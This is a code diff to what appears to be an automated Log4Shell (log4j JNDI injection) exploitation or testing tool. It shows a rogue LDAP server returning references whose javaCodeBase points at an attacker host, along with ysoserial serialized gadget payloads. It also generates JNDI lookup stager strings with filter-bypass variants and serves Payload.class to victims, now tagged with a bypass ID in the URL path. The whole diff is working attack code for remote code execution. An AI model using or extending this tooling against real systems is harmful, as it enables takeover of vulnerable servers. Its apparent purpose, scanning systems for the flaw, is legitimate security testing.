@@ -44,7 +44,7 @@ class LDAP(services.Service):
     }
     RESPONSE_LDAP_REFERENCE = {
         'javaClassName': 'Payload',
-        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
+        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/$$BYPASS_ID/',  # NOTE: Path must end with '/'
         'objectClass': 'javaNamingReference',
         'javaFactory': 'Payload',
     }
@@ -69,6 +69,7 @@ class LDAP(services.Service):
     def serialize(self, query_name, context):
         query_name_tmp = query_name.split('/')
         template_type = query_name_tmp[0]
+        context['BYPASS_ID'] = query_name_tmp[-1]
         template = self.RESPONSE_LDAP.get(template_type)
         if template == self.RESPONSE_LDAP_SERIALIZED:
             template = self.RESPONSE_LDAP_SERIALIZED.copy()
@@ -76,8 +77,9 @@ class LDAP(services.Service):
             payload = YsoserialPayload(config)
             context['CLASS'] = cls
             template['javaSerializedData'] = payload.generate(context)
-        if not template or 'cls' not in locals():
-            template = self.RESPONSE_LDAP_REFERENCE
+        else:
+            template = self.RESPONSE_LDAP_REFERENCE.copy()
+            template['javaCodeBase'] = string.Template(template['javaCodeBase']).substitute(context)
         return self.search_res_entry(query_name, template)
 
     def bind_response(self):
@@ -156,15 +158,15 @@ class SendRequests(scenarios.Scene):
         stagers = list()
         for ldap_type in LDAP.RESPONSE_LDAP.keys():
             for port in config.LDAP_PORTS:
-                for bypass in config.BYPASSES:
+                for bypass_id, bypass in enumerate(config.BYPASSES):
                     if ldap_type == 'serialized':
                         for cls in YsoserialPayload.PAYLOAD_CLASSES:
                             stagers.append(
-                                Template('${' + bypass + '/' + ldap_type + '/' + cls + '}').substitute(LDAP_PORT=port, **self.context)
+                                Template('${' + bypass + '/' + ldap_type + '/' + cls + '/' + str(bypass_id) + '}').substitute(LDAP_PORT=port, **self.context)
                             )
                     else:
                         stagers.append(
-                            Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
+                            Template('${' + bypass + '/' + ldap_type + '/' + str(bypass_id) + '}').substitute(LDAP_PORT=port, **self.context)
                         )
         for stager in stagers:
             logging.debug('Using stager: ' + stager)
@@ -181,9 +183,10 @@ class Server(services.HTTPStatic):
         super().__init__(*args, **kwargs)
         self.payload = class_import(config.PAYLOAD_CLS)(config)
 
-    def payload(self, request, sock):
+    def payload(self, request, params, sock):
         context = self.scenario.context.copy()
         context['VICTIM_HOST'] = sock.getpeername()[0]
+        context['BYPASS_ID'] = params['bypass_id']
         output = self.payload.generate(context)
         logging.debug(str(context['VICTIM_HOST']) + ' requested payload, delivering...')
         return output
@@ -200,7 +203,7 @@ if __name__ == '__main__':
     httpd = Server(address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
     httpd.add_route('/', 'Welcome')
     httpd.add_route('/send-requests', 'Sending requests...')
-    httpd.add_route('/Payload.class', Server.payload)
+    httpd.add_route('/<bypass_id>/Payload.class', Server.payload)
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
     story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
